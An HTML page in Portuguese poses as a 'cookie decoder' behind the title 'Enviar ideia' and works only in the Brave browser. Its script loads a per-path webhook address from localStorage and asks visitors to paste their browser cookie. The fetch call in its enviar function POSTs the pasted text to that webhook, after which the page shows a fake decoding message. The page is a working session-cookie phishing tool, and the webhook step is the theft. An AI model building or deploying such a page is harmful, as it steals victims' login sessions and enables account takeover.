<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Enviar ideia</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      background: #0f0f0f;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: #1c1c1c;
      padding: 24px;
      border-radius: 14px;
      width: 90%;
      max-width: 500px;
    }
    textarea, button {
      width: 100%;
      padding: 12px;
      margin-top: 12px;
      border-radius: 10px;
      border: none;
      font-size: 14px;
    }
    textarea {
      background: #2a2a2a;
      color: #fff;
      resize: none;
      height: 120px;
    }
    button {
      background: #5865F2;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="box" id="app"></div>

  <script>
    // ðŸ”’ BLOQUEIO FORA DO BRAVE
    if (!navigator.brave) {
      document.body.innerHTML = `
        <div style="
          background:#0f0f0f;
          color:#fff;
          font-family:Arial;
          height:100vh;
          display:flex;
          align-items:center;
          justify-content:center;
          text-align:center;
          padding:20px;
        ">
          <div>
            <h2>Navegador nÃ£o suportado</h2>
            <p>Esse site funciona apenas no <b>Brave Browser</b>.</p>
            <p>Por favor, baixe o brave e entre no site por ele</p>
          </div>
        </div>
      `;
      throw new Error("Not Brave");
    }

    // ðŸ§  LÃ“GICA DO SITE
    const nome = location.pathname.replace("/", "");
    const webhook = localStorage.getItem("webhook_" + nome);
    const app = document.getElementById("app");

    if (!webhook) {
      app.innerHTML = `
        <h3>Site nÃ£o encontrado</h3>
        <p>Busque ajuda com quem te mandou o site.</p>
      `;
    } else {
      app.innerHTML = `
        <h2>Envie o Cookie para Decodificar</h2>
        <textarea id="msg" placeholder="Preencha"></textarea>
        <button onclick="enviar()">Enviar</button>
      `;
    }

    function enviar() {
      const msg = document.getElementById("msg").value;
      if (!msg) return alert("Por favor, preencha");

      fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: msg })
      });

      app.innerHTML = `
        <h2>Decodificador V1</h2>
        <p>Espere o Decodificador Decodificar...</p>
      `;
    }
  </script>

</body>
</html>
